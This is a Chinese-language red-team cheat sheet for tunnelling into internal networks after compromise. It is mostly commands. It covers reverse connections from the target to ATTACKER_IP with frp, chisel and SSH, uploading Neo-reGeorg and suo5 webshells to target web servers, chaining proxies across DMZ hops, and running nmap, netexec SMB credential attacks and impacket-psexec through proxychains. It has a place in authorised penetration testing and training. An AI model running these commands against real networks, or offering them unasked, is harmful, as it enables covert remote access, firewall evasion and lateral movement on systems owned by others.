# 隧道工具配置详解

## frp（最稳定，推荐长期使用）

```bash
# 攻击者：启动 frps
frps -c frps.ini
# frps.ini: [common] bind_port = 7000

# 目标：上传并启动 frpc
frpc -c frpc.ini
# frpc.ini:
# [common]
# server_addr = ATTACKER_IP
# server_port = 7000
# [socks5]
# type = tcp
# remote_port = 1080
# plugin = socks5
```
攻击者本地 1080 端口即为内网 SOCKS5 代理。

## chisel（单二进制，快速部署）

```bash
# 攻击者
chisel server --reverse --port 8080
# 目标
chisel client ATTACKER_IP:8080 R:1080:socks
```

## Neo-reGeorg（HTTP 隧道，仅 HTTP 出网时使用）

```bash
# 生成 webshell 隧道文件
python neoreg.py generate -k PASSWORD
# 上传 tunnel.php 到 Web 目录
# 攻击者连接
python neoreg.py -k PASSWORD -u http://target/tunnel.php -p 1080
```

## SSH 隧道（有 SSH 凭据时最简单）

```bash
# 动态 SOCKS 代理（一条命令搞定）
ssh -D 1080 -N -f user@JUMPBOX

# 本地端口转发（访问内网特定服务）
ssh -L 3389:INTERNAL_HOST:3389 -N -f user@JUMPBOX
# 然后 rdesktop 127.0.0.1:3389

# 远程端口转发（把内网服务暴露到攻击者）
ssh -R 8888:INTERNAL_HOST:80 -N -f user@JUMPBOX

# SSH 反向隧道（从目标反向连接到攻击者）
ssh -R 1080 attacker@ATTACKER_IP
```

## 多跳代理链

当目标在第三层网络（攻击者 → DMZ → 内网A → 内网B）：

```
攻击者 ←[frp/chisel]→ DMZ跳板(10.0.0.5) ←[SSH/frp]→ 内网A主机(172.16.0.10) → 目标网段(192.168.x.x)
```

**方法一：链式 SSH**
```bash
ssh -J user1@DMZ,user2@10.0.0.5 user3@172.16.0.10
```

**方法二：链式 SOCKS**
```bash
# 第一层：DMZ → 攻击者 SOCKS :1080
ssh -D 1080 user@DMZ
# 第二层：通过第一层代理建立到内网A的隧道
proxychains ssh -D 1081 user@10.0.0.5
# proxychains.conf 改为 socks5 127.0.0.1 1081 访问最深层
```

**方法三：frp 级联**
在每一跳上部署 frpc，层层转发到攻击者的 frps。

## proxychains 配置与使用

```bash
# /etc/proxychains4.conf 末尾添加：
socks5 127.0.0.1 1080
```

```bash
# 通过代理执行工具
proxychains nmap -sT -Pn -p 22,80,445,3389 10.0.0.0/24
proxychains netexec smb 10.0.0.0/24 -u USER -p PASS
proxychains curl http://10.0.0.100/
proxychains impacket-psexec DOMAIN/admin:pass@10.0.0.1
```

**⚠️ proxychains 只支持 TCP，不支持 ICMP（ping 不可用，nmap 用 `-Pn -sT`）**

## neo-reGeorg — Web 隧道代理

当只有 HTTP/HTTPS 出网（防火墙封锁其他端口）时，通过 Webshell 建立 SOCKS5 隧道：

```bash
# 生成隧道 Webshell（支持 PHP/ASPX/JSP）
python3 /pentest/Neo-reGeorg/neoreg.py generate -k PASSWORD

# 上传生成的 tunnel.php 到目标 Web 服务器

# 启动本地 SOCKS5 代理
python3 /pentest/Neo-reGeorg/neoreg.py -k PASSWORD -u http://TARGET/tunnel.php -p 1080

# 通过代理访问内网
proxychains nmap -sT -Pn 10.0.0.0/24
```

## suo5 — HTTP 正向代理隧道

基于 HTTP 的高性能正向代理，比 reGeorg 更快更稳定：

```bash
# 上传 suo5 服务端（Go 编译的单文件 Webshell，支持 JSP/PHP/ASPX）
# 服务端文件在 /pentest/suo5/

# 连接（SOCKS5 代理）
./suo5 -t http://TARGET/suo5.jsp -l 127.0.0.1:1080

# 通过代理访问内网
proxychains fscan -h 10.0.0.0/24
```
